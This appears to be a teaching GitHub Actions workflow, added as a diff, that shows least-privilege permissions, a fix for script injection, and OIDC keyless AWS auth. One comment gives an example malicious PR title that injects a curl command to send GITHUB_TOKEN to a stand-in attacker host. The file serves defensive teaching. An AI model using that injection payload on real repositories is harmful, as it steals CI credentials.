@@ -1,0 +1,69 @@
+##
+## Demonstrates three security patterns every workflow author should know:
+## 1. Least-privilege permissions — only declare what the job actually needs
+## 2. Script injection — how attackers exploit ${{ expressions }} in run: and how to prevent it
+## 3. OIDC keyless auth — request short-lived cloud tokens instead of storing static secrets
+##
+
+name: "07 · Security"
+
+permissions:
+  contents: read  # workflow-level default: read-only — the built-in default is broader than most jobs need
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  # Pattern 1 — least privilege
+  # This job only reads code and runs tests. Declaring only contents: read
+  # limits what the GITHUB_TOKEN can do if this workflow is ever compromised.
+  run-tests:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read  # explicit at job level too — makes intent clear and overrides if the workflow default changes
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+          cache: "npm"
+      - run: npm install
+      - run: npm test
+
+  # Pattern 2 — script injection
+  # ${{ expressions }} are interpolated before the shell runs, so user-controlled
+  # values become part of the script text. Routing them through env vars fixes this.
+  injection-safe:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      # UNSAFE — never do this:
+      # run: echo "PR title: ${{ github.event.pull_request.title }}"
+      # An attacker sets the PR title to: `"; curl attacker.com?t=$GITHUB_TOKEN; echo "`
+      # and that shell code executes because the expression is substituted raw
+
+      - name: Safe pattern — env var intermediary
+        env:
+          PR_TITLE: "${{ github.event.pull_request.title || 'no PR' }}"  # expression goes into an env var, not the script
+        run: |
+          echo "PR title: $PR_TITLE"  # $PR_TITLE is just a string here — the shell can't execute it
+
+  # Pattern 3 — OIDC keyless auth (reference, uncomment to use with AWS)
+  # Instead of storing a static AWS secret, the runner requests a short-lived JWT
+  # from GitHub's OIDC provider. AWS verifies it and issues a temporary credential.
+  # No secret to rotate, no secret to leak.
+  #
+  # oidc-keyless-auth:
+  #   runs-on: ubuntu-latest
+  #   permissions:
+  #     contents: read
+  #     id-token: write  # required to request an OIDC token from GitHub's identity provider
+  #   steps:
+  #     - uses: aws-actions/configure-aws-credentials@v4
+  #       with:
+  #         role-to-assume: ${{ secrets.AWS_ROLE_ARN }}  # the AWS role that trusts GitHub's OIDC provider
+  #         aws-region: us-east-1
+  #     - run: aws s3 cp playwright-report/ s3://my-test-results/ --recursive
